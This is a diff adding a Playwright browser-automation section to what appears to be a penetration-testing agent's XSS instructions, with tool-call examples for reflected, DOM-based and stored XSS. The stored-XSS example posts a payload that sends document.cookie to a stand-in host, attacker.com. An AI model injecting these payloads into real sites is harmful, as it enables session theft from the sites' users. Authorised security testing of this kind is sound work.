@@ -595,6 +595,133 @@ console.log("Referrer:", document.referrer);
 // Look for: innerHTML, outerHTML, document.write, eval
 ```
 
+### Playwright Browser Automation (MCP)
+
+**Use Playwright for automated XSS testing, especially for:**
+- DOM-based XSS verification
+- Single Page Applications (SPAs)
+- JavaScript-heavy dynamic content
+- Screenshot evidence capture
+- Multi-step exploitation chains
+
+**Example: Automated Reflected XSS Testing**
+```python
+# Using Playwright MCP tools via Claude
+
+# 1. Navigate to target
+playwright_navigate(url="https://target.com/search")
+
+# 2. Fill search field with XSS payload
+playwright_fill(
+    selector="input[name='q']",
+    value="<img src=x onerror=alert('XSS')>"
+)
+
+# 3. Submit form
+playwright_click(selector="button[type='submit']")
+
+# 4. Check if payload executed in DOM
+result = playwright_evaluate(script="""
+    () => {
+        return document.body.innerHTML.includes('<img src=x onerror=');
+    }
+""")
+
+# 5. Capture screenshot as evidence
+playwright_screenshot(path="findings/finding-001/evidence/xss-reflected.png")
+```
+
+**Example: DOM-based XSS Detection**
+```python
+# Test DOM-based XSS via URL fragment
+playwright_navigate(
+    url="https://target.com/profile#<img src=x onerror=alert(1)>"
+)
+
+# Wait for JavaScript to process fragment
+playwright_wait(timeout=2000)
+
+# Check if payload reflected in DOM
+playwright_evaluate(script="""
+    () => {
+        // Check both document.body and specific elements
+        return {
+            bodyHTML: document.body.innerHTML,
+            hasPayload: document.body.innerHTML.includes('onerror=alert')
+        };
+    }
+""")
+
+# Capture evidence
+playwright_screenshot(
+    path="findings/finding-002/evidence/dom-xss.png",
+    full_page=True
+)
+```
+
+**Example: Stored XSS with Playwright**
+```python
+# Step 1: Inject stored XSS payload
+playwright_navigate(url="https://target.com/comment/new")
+
+playwright_fill(
+    selector="textarea[name='comment']",
+    value="<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"
+)
+
+playwright_click(selector="button[type='submit']")
+
+# Capture injection screenshot
+playwright_screenshot(path="evidence/stored-xss-injection.png")
+
+# Step 2: Navigate to where stored content displays
+playwright_navigate(url="https://target.com/comments")
+
+playwright_wait(timeout=2000)
+
+# Step 3: Verify payload execution
+playwright_evaluate(script="""
+    () => {
+        return document.body.innerHTML.includes('<img src=x onerror=');
+    }
+""")
+
+# Capture execution screenshot
+playwright_screenshot(path="findings/finding-003/evidence/stored-xss-execution.png")
+```
+
+**Example: XSS Impact Demonstration**
+```python
+# Demonstrate cookie theft with Playwright
+playwright_navigate(url="https://target.com/vulnerable?q=<script>...</script>")
+
+# Execute monitoring script
+playwright_evaluate(script="""
+    () => {
+        // Monitor for outbound requests (cookie theft)
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            console.log('Outbound fetch:', args[0]);
+            return originalFetch.apply(this, args);
+        };
+    }
+""")
+
+# Trigger XSS payload
+# Monitor console for cookie theft attempts
+playwright_screenshot(path="evidence/xss-impact.png")
+```
+
+**Benefits of Playwright for XSS Testing**:
+- ✅ Automated payload testing across multiple contexts
+- ✅ Real browser JavaScript execution (catches DOM XSS)
+- ✅ Screenshot/video evidence capture
+- ✅ Network monitoring for impact demonstration
+- ✅ Multi-step exploitation automation
+- ✅ SPA and dynamic content testing
+
+**See**: `attacks/essential-skills/playwright-automation.md` for complete guide
+
 ## Success Criteria
 
 Agent mission is **SUCCESSFUL** when:
